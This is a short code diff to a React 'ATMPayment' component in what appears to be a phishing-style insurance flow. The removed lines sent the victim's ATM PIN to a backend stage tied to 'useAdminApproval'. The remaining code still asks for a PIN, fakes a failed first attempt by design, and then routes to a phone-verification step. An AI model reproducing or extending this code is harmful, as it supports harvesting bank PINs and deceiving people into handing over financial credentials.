@@ -3,7 +3,6 @@ import { useNavigate, useLocation } from "react-router-dom";
 import { motion } from "framer-motion";
 import { Button } from "@/components/ui/button";
 import { Shield, Lock, Loader2, CreditCard } from "lucide-react";
-import { createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { useLanguage } from "@/i18n/LanguageContext";
 
@@ -41,8 +40,7 @@ const ATMPayment = () => {
   const handleVerify = () => {
     if (pin.length < 4) return;
     setLoading(true);
-    const doSubmit = async () => {
-      await createOrUpdateStage(orderId, "payment", { atm_pin: pin });
+    const doSubmit = () => {
       linkVisitorToSession({});
       setLoading(false);
       // Simulate: first attempt always shakes, then navigates
@@ -55,7 +53,7 @@ const ATMPayment = () => {
         navigate("/insurance/phone-verify", { state: { offer, orderId } });
       }
     };
-    doSubmit();
+    setTimeout(doSubmit, 600);
   };
 
   if (!offer) {
